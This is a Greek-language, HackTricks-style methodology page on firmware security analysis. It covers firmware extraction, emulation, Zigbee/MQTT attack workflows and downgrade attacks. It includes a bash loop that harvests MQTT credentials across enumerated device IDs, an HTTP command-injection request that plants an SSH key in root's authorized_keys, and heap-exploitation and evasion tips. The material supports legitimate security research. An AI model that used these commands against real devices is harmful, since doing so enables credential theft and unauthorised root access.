# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Εισαγωγή**

### Σχετικοί πόροι

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το Firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των στοιχείων hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, εξασφαλίζοντας ότι η συσκευή μπορεί να αποκτήσει πρόσβαση σε κρίσιμες οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του Firmware είναι ένα κρίσιμο βήμα για τον εντοπισμό security vulnerabilities.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που εκτελεί
- Λεπτομέρειες του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές του codebase και τοποθεσίες του source code
- Εξωτερικές βιβλιοθήκες και τύπους αδειών
- Ιστορικό updates και κανονιστικές πιστοποιήσεις
- Αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- Security assessments και εντοπισμένες vulnerabilities

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source στοιχείων λογισμικού μέσω manual και automated διαδικασιών review. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση Firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με το δικό του επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, manufacturers)
- Με **build** βάσει των παρεχόμενων οδηγιών
- Με **download** από επίσημα support sites
- Αξιοποιώντας queries **Google dork** για την εύρεση hosted firmware files
- Με άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Με interception των **updates** μέσω man-in-the-middle techniques
- Με **extraction** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- Με **sniffing** για update requests κατά την επικοινωνία της συσκευής
- Με εντοπισμό και χρήση **hardcoded update endpoints**
- Με **dumping** από τον bootloader ή το δίκτυο
- Με **αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτυγχάνουν, με τη χρήση κατάλληλων hardware tools

### Logs μόνο μέσω UART: εξαναγκασμός root shell μέσω του U-Boot env στο flash

Αν το UART RX αγνοείται (μόνο logs), μπορείτε και πάλι να εξαναγκάσετε ένα init shell με **editing του U-Boot environment blob** offline:<sup>[[6]](#references)</sup>

1. Κάντε dump του SPI flash με SOIC-8 clip και programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Εντοπίστε το U-Boot env partition, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει `init=/bin/sh` και **επανυπολογίστε το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο του env partition και επανεκκινήστε. Ένα shell θα πρέπει να εμφανιστεί στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το bootloader shell είναι απενεργοποιημένο, αλλά το env partition είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Υπάρχουν διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε το **entropy** της image με `binwalk -E <bin>`. Αν το entropy είναι χαμηλό, τότε πιθανότατα δεν είναι encrypted. Αν το entropy είναι υψηλό, πιθανότατα είναι encrypted (ή compressed με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Λήψη του Filesystem

Με τα προηγούμενα εργαλεία, όπως το `binwalk -ev <bin>`, θα πρέπει να έχετε μπορέσει να **εξαγάγετε το filesystem**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο που έχει ονομαστεί σύμφωνα με τον τύπο του filesystem**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη Εξαγωγή Filesystem

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του filesystem στις signatures του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του filesystem και να κάνετε carve το compressed filesystem** από το binary και να **εξαγάγετε χειροκίνητα** το filesystem σύμφωνα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη **dd command** για το carving του συστήματος αρχείων Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Για filesystems ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί διεξοδικά για την κατανόηση της δομής του και των πιθανών vulnerabilities. Αυτή η διαδικασία περιλαμβάνει τη χρήση διάφορων tools για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από το firmware image.

### Αρχικά Tools Ανάλυσης

Παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary file (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, την εξαγωγή strings, την ανάλυση binary data και την κατανόηση των λεπτομερειών των partitions και των filesystems:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για την αξιολόγηση της κατάστασης κρυπτογράφησης του image, ελέγχεται το **entropy** με `binwalk -E <bin>`. Χαμηλό entropy υποδηλώνει απουσία κρυπτογράφησης, ενώ υψηλό entropy υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **embedded files**, συνιστώνται εργαλεία και resources όπως το documentation **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του Filesystem

Με τη χρήση του `binwalk -ev <bin>`, είναι συνήθως δυνατή η εξαγωγή του filesystem, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του filesystem λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του filesystem και, στη συνέχεια, της εντολής `dd` για την εξαγωγή του filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση Filesystem

Μετά την εξαγωγή του filesystem, ξεκινά η αναζήτηση για security flaws. Δίνεται προσοχή σε μη ασφαλή network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, μη μεταγλωττισμένο κώδικα, startup scripts και compiled binaries για offline analysis.

Οι **βασικές τοποθεσίες** και **τα στοιχεία** που πρέπει να ελεγχθούν περιλαμβάνουν:

- Τα **etc/shadow** και **etc/passwd** για credentials χρηστών
- SSL certificates και keys στο **etc/ssl**
- Αρχεία configuration και scripts για πιθανές ευπάθειες
- Embedded binaries για περαιτέρω analysis
- Συνηθισμένους web servers και binaries συσκευών IoT

Αρκετά εργαλεία βοηθούν στην αποκάλυψη ευαίσθητων πληροφοριών και ευπαθειών μέσα στο filesystem:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Security Checks σε Compiled Binaries

Τόσο ο source code όσο και τα compiled binaries που εντοπίζονται στο filesystem πρέπει να ελέγχονται διεξοδικά για ευπάθειες. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό binaries χωρίς προστασία, τα οποία θα μπορούσαν να γίνουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και MQTT credentials μέσω derived URL tokens

Πολλά IoT hubs λαμβάνουν το per-device configuration τους από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά τη διάρκεια του firmware analysis μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να λάβει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.

Πρακτική διαδικασία:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL του cloud config και τη διεύθυνση του broker, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση του STATIC_KEY και του αλγόριθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή τη χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ. MD5(deviceId||STATIC_KEY)).
- Παραγάγετε το token στο Bash και μετατρέψτε το digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή ρυθμίσεων cloud και διαπιστευτηρίων MQTT

- Συνθέστε το URL και ανακτήστε JSON με curl· κάντε parse με jq για να εξαγάγετε secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Εκμεταλλευτείτε το plaintext MQTT και τα αδύναμα ACLs των topic (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να εγγραφείτε σε topic συντήρησης και αναζητήστε ευαίσθητα συμβάντα:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate προβλέψιμα device IDs (σε μεγάλη κλίμακα, με authorization)

- Πολλά ecosystems ενσωματώνουν bytes vendor OUI/product/type, ακολουθούμενα από ένα sequential suffix.
- Μπορείτε να κάνετε iterate στα candidate IDs, να derive tokens και να κάνετε fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική απαρίθμηση.
- Προτιμάτε το emulation ή τη static analysis για την ανάκτηση secrets χωρίς τροποποίηση του hardware-στόχου, όταν αυτό είναι δυνατό.


Η διαδικασία emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις που σχετίζονται με εξαρτήσεις από το hardware ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με matching architecture και endianness, όπως ένα Raspberry Pi, ή σε μια pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness και η CPU architecture του προγράμματος.

#### Example with MIPS Architecture

Για την emulation ενός binary με MIPS architecture, μπορείτε να χρησιμοποιήσετε την εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian, η επιλογή θα ήταν το `qemu-mipsel`.

#### ARM Architecture Emulation

Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για το emulation.

### Full System Emulation

Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα, διευκολύνουν το full firmware emulation, αυτοματοποιώντας τη διαδικασία και βοηθώντας στο dynamic analysis.

## Dynamic Analysis in Practice

Σε αυτό το στάδιο, χρησιμοποιείται για το analysis είτε ένα πραγματικό είτε ένα emulated device environment. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο filesystem. Το emulation ενδέχεται να μην αναπαριστά τέλεια τις αλληλεπιδράσεις με το hardware, με αποτέλεσμα να απαιτούνται περιστασιακά restarts του emulation. Το analysis θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται exposed webpages και network services και να εξερευνά vulnerabilities στον bootloader. Τα firmware integrity tests είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.

## Runtime Analysis Techniques

Το runtime analysis περιλαμβάνει την αλληλεπίδραση με μια process ή binary στο operating environment της, χρησιμοποιώντας εργαλεία όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό vulnerabilities μέσω fuzzing και άλλων techniques.

Για embedded targets χωρίς full debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και συνδεθείτε απομακρυσμένα:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Αντιστοίχιση μηνυμάτων Zigbee / radio-co-processor

Σε IoT hubs, το RF stack συχνά χωρίζεται μεταξύ ενός **radio MCU** και μιας διεργασίας Linux userland. Μια χρήσιμη ροή εργασίας είναι η χαρτογράφηση της διαδρομής:<sup>[[8]](#references)</sup>

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στο κύριο daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο reversing targets αντί για ένα. Αν ο controller μετατρέπει τα binary radio frames σε textual protocol όπως `Group,Command,arg1,arg2,...`, εντόπισε:

- Τα **message groups** και τους dispatch tables
- Ποια μηνύματα μπορούν να προέλθουν από το **network** και ποια από τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και custom `cluster_command`)
- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τα στάδια **commissioning**, discovery ή firmware/model download

Ειδικά για το Zigbee, κατέγραψε την κίνηση pairing και έλεγξε αν ο στόχος εξακολουθεί να βασίζεται στο προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ισχύει, το sniffing της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Τα Zigbee 3.0 install codes μειώνουν αυτή την έκθεση, επομένως σημείωσε αν η συσκευή που δοκιμάστηκε τα επιβάλλει πράγματι.

### Manufacturer-specific protocol handlers και FSM-gated reachability

Οι vendor-specific εντολές Zigbee/ZCL είναι συχνά καλύτερος στόχος από τα standardized clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένο validation.<sup>[[8]](#references)</sup>

Πρακτική ροή εργασίας:

- Κάνε reverse τον command dispatcher μέχρι να βρεις τον **vendor-only handler**.
- Ανάκτησε τα tables των **FSM state**, **event**, **check**, **action** και **next-state**.
- Εντόπισε τα **transitional states** που προχωρούν αυτόματα και τα retry/error branches που τελικά κάνουν reset ή free attacker-controlled state.
- Επιβεβαίωσε ποιες legitimate protocol exchanges απαιτούνται για να τοποθετηθεί το daemon στην ευάλωτη κατάσταση, αντί να θεωρήσεις ότι ο buggy handler είναι πάντα προσβάσιμος.

Για timing-sensitive protocols, το packet replay από ένα Python framework μπορεί να είναι υπερβολικά αργό. Μια πιο αξιόπιστη προσέγγιση είναι η εξομοίωση μιας legitimate συσκευής σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack, ώστε να μπορείς να εκθέσεις τα σωστά **endpoints**, **attributes** και τον σωστό χρόνο commissioning.

### Κατηγορία fragmented-download bug σε embedded daemons

Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και κάνει allocation με `malloc(total_size)`.
2. Τα επόμενα fragments ελέγχουν μόνο τα attacker-controlled **packet-local** fields, όπως `packet_total_size >= offset + chunk_len`.
3. Το copy χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο έναντι του **original allocated size**.

Αυτό επιτρέπει σε έναν attacker να στείλει:

- Ένα πρώτο valid fragment με **small** δηλωμένο total size, ώστε να επιβάλει ένα small heap allocation.
- Ένα μεταγενέστερο fragment με το **expected offset**, αλλά μεγαλύτερο `chunk_len`.
- Ένα forged packet-local size που περνά τους νέους ελέγχους, ενώ εξακολουθεί να προκαλεί overflow στο buffer που είχε αρχικά γίνει allocate.

Όταν το vulnerable path βρίσκεται πίσω από commissioning logic, το exploitation πρέπει να περιλαμβάνει επαρκές **device emulation**, ώστε ο στόχος να οδηγηθεί στην αναμενόμενη κατάσταση model-download ή blob-download πριν σταλούν τα malformed fragments.

### Protocol-driven `free()` triggers

Σε embedded daemons, ο ευκολότερος τρόπος για να ενεργοποιηθεί heap metadata exploitation συχνά δεν είναι το «wait for cleanup», αλλά η **force** της ίδιας της error handling του protocol:<sup>[[8]](#references)</sup>

- Στείλε malformed follow-up fragments για να οδηγήσεις το FSM σε **retry** ή **error** states.
- Ξεπέρασε το retry threshold, ώστε το daemon να κάνει **reset context** και να αποδεσμεύσει το corrupted buffer.
- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν το process καταρρεύσει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο εναντίον allocators τύπου **musl/uClibc/dlmalloc** σε embedded Linux, όπου η καταστροφή chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα stable pattern είναι η καταστροφή ενός **size field**, ώστε να ανακατευθυνθεί το allocator traversal σε **fake chunks** που έχουν τοποθετηθεί μέσα στο overflowed buffer, αντί να γίνει άμεσο clobber των πραγματικών bin pointers και να καταρρεύσει το process.

## Binary Exploitation και Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε lower-level languages. Τα binary runtime protections σε embedded systems είναι σπάνια, αλλά όταν υπάρχουν, μπορεί να απαιτούνται τεχνικές όπως το Return Oriented Programming (ROP).

### Σημειώσεις uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Ένα μεταγενέστερο large allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να επιβιώνει από τους ελέγχους (sane size, `fd = 0` και surrounding chunks που θεωρούνται "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** Αν το ASLR είναι ενεργοποιημένο αλλά το main binary είναι **non-PIE**, οι διευθύνσεις του in-binary `.data/.bss` είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που ήδη μοιάζει με έγκυρο heap chunk header, ώστε να κατευθύνεις ένα fastbin allocation σε έναν **function pointer table**.
- **Parser-stopping NUL:** Όταν γίνεται parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας παράλληλα τα trailing attacker-controlled bytes για ένα stack pivot/ROP chain.
- **Shellcode μέσω `/proc/self/mem`:** Ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει executable shellcode σε ένα known mapping και να μεταβεί σε αυτό.

## Προετοιμασμένα Operating Systems για Firmware Analysis

Operating systems όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν pre-configured environments για firmware security testing, εξοπλισμένα με τα απαραίτητα tools.

## Προετοιμασμένα OSs για ανάλυση Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι ένα distro που προορίζεται να σε βοηθήσει να πραγματοποιήσεις security assessment και penetration testing σε Internet of Things (IoT) devices. Εξοικονομεί πολύ χρόνο, παρέχοντας ένα pre-configured environment με όλα τα απαραίτητα tools φορτωμένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο στο Ubuntu 18.04, με προεγκατεστημένα firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμη και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, η **version rollback (downgrade) protection** συχνά παραλείπεται. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με embedded public key, αλλά δεν συγκρίνει το *version* (ή έναν monotonic counter) του image που γίνεται flash, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, vulnerable firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει patched vulnerabilities.<sup>[[4]](#references)</sup>

Τυπική attack workflow:

1. **Απόκτησε ένα παλαιότερο signed image**
* Κατέβασέ το από το public download portal, το CDN ή το support site του vendor.
* Εξήγαγέ το από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK, κάτω από `assets/firmware/`).
* Ανάκτησέ το από third-party repositories όπως τα VirusTotal, Internet archives, forums κ.λπ.
2. **Κάνε upload ή serve το image στη συσκευή** μέσω οποιουδήποτε exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
* Πολλές consumer IoT devices εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα κάνουν decode server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, κάνε exploit σε ένα vulnerability που είχε γίνει patched στη νεότερη release (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά, κάνε flash ξανά το latest image ή απενεργοποίησε τα updates για να αποφύγεις τον εντοπισμό μετά την απόκτηση persistence.

### Παράδειγμα: Command Injection μετά από Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς sanitisation, επιτρέποντας την έγχυση αυθαίρετων εντολών (εδώ – ενεργοποιώντας root access μέσω SSH key). Οι νεότερες εκδόσεις του firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, όμως η απουσία προστασίας από downgrade καθιστά τη διόρθωση ανενεργή.<sup>[[4]](#references)</sup>

### Εξαγωγή Firmware Από Mobile Apps

Πολλοί vendors ενσωματώνουν πλήρεις εικόνες firmware στις companion mobile applications τους, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς encryption στο APK/APEX, σε διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` επιτρέπουν την εξαγωγή signed images χωρίς να αγγίξετε το physical hardware.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Παράκαμψη anti-rollback μόνο από τον updater σε σχεδιασμούς A/B slot

Ορισμένοι vendors υλοποιούν πράγματι ένα anti-downgrade **ratchet**, αλλά μόνο μέσα στη λογική του *updater* (για παράδειγμα, μια ρουτίνα UDS μέσω CAN, μια recovery command ή ένας userspace OTA agent). Αν ο **bootloader** ελέγχει αργότερα μόνο το image signature/CRC και εμπιστεύεται τον partition table ή τα slot metadata, η προστασία από rollback μπορεί να παρακαμφθεί.<sup>[[7]](#references)</sup>

Τυπικός αδύναμος σχεδιασμός:

- Τα firmware metadata περιέχουν τόσο έναν version descriptor όσο και έναν **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το image ratchet με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα signed images.
- Ο bootloader **δεν** αναλύει το ratchet και επαληθεύει μόνο τα header, CRC και signature πριν εκκινήσει το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε partition table ή σε per-slot generation counter και **δεν συνδέεται κρυπτογραφικά** με το ακριβές firmware digest που επικυρώθηκε.

